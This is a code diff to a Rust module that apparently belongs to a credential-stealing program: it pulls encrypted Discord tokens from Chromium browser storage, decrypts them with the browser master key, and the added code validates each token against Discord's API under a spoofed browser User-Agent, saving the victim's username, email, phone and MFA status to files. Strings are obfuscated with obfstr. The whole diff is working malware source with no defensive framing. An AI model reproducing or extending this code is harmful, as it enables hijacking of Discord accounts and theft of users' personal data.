@@ -1,12 +1,56 @@
 use crate::alloc::borrow::ToOwned;
-use alloc::string::String;
+use alloc::format;
+use alloc::string::{String, ToString};
+use alloc::sync::Arc;
 use alloc::vec::Vec;
+use core::fmt::{Display, Formatter};
 use obfstr::obfstr as s;
-use tasks::{parent_name, Task};
+use requests::{Request, RequestBuilder, ResponseBodyExt};
+use tasks::{parent_name, CompositeTask, Task};
 use utils::base64::base64_decode;
 use utils::browsers::chromium;
 use utils::browsers::chromium::extract_master_key;
 use utils::path::{Path, WriteToFile};
+
+struct TokenValidationTask {
+    token: String,
+}
+
+impl Task for TokenValidationTask {
+    unsafe fn run(&self, parent: &Path) {
+        let Some(info) = get_token_info(self.token.clone()) else {
+            return
+        };
+
+        let _ = info
+            .to_string()
+            .write_to(parent / format!("{}.txt", info.username));
+    }
+}
+
+struct TokenWriterTask {
+    inner: CompositeTask
+}
+
+impl TokenWriterTask {
+    fn new(tokens: Vec<String>) -> Self {
+        let tokens: Vec<Arc<dyn Task>> = tokens
+            .into_iter()
+            .map(|token| TokenValidationTask{ token })
+            .map(|task| Arc::new(task) as Arc<dyn Task>)
+            .collect();
+
+        Self {
+            inner: CompositeTask::new(tokens)
+        }
+    }
+}
+
+impl Task for TokenWriterTask {
+    unsafe fn run(&self, parent: &Path) {
+        self.inner.run(parent);
+    }
+}
 
 pub(super) struct DiscordTask;
 
@@ -22,9 +66,7 @@ impl Task for DiscordTask {
             return
         }
 
-        let _raw_tokens = tokens
-            .join("\n")
-            .write_to(parent / s!("_raw.txt"));
+        TokenWriterTask::new(tokens).run(parent);
     }
 }
 
@@ -97,7 +139,7 @@ fn extract_encrypted_token_strings(input: &[u8]) -> Vec<&[u8]> {
     const PREFIX: &[u8] = b"dQw4w9WgXcQ:";
     const MAX_LOOKAHEAD: usize = 500;
     let mut result = Vec::new();
-
+    
     let mut i = 0;
     while i <= input.len().saturating_sub(PREFIX.len()) {
         if &input[i..i + PREFIX.len()] == PREFIX {
@@ -120,4 +162,57 @@ fn extract_encrypted_token_strings(input: &[u8]) -> Vec<&[u8]> {
     }
     
     result
+}
+
+struct TokenInfo {
+    username: String,
+    token: String,
+    mfa: bool,
+    phone: Option<String>,
+    email: Option<String>,
+    flags: u32,
+    public_flags: u32,
+}
+
+impl Display for TokenInfo {
+    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
+        write!(
+            f, 
+            "Token: {}\n\
+            Username: {}\n\
+            Phone: {}\n\
+            Email: {}\n\
+            MFA: {}",
+            self.token,
+            self.username,
+            self.phone.as_ref().unwrap_or(&"None".to_string()),
+            self.email.as_ref().unwrap_or(&"None".to_string()),
+            if self.mfa { "Enabled" } else { "Disabled" },
+        )
+    }
+}
+
+fn get_token_info(token: String) -> Option<TokenInfo> {
+    let resp = Request::get("https://discord.com/api/v9/users/@me")
+        .header("Authorization", &token)
+        .header("User-Agent", s!("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0"))
+        .header("Referer", "https://discord.com/channels/@me")
+        .build()
+        .send().ok()?;
+
+    if resp.status_code() != 200 {
+        return None
+    }
+
+    let json = resp.body().as_json().ok()?;
+
+    Some(TokenInfo {
+        username: json.get("username")?.as_string()?.to_owned(),
+        token,
+        mfa: *json.get("mfa_enabled")?.as_bool()?,
+        phone: json.get("phone")?.as_string().map(|s| s.to_owned()),
+        email: json.get("email")?.as_string().map(|s| s.to_owned()),
+        flags: *json.get("flags")?.as_number()? as u32,
+        public_flags: *json.get("public_flags")?.as_number()? as u32,
+    })
 }
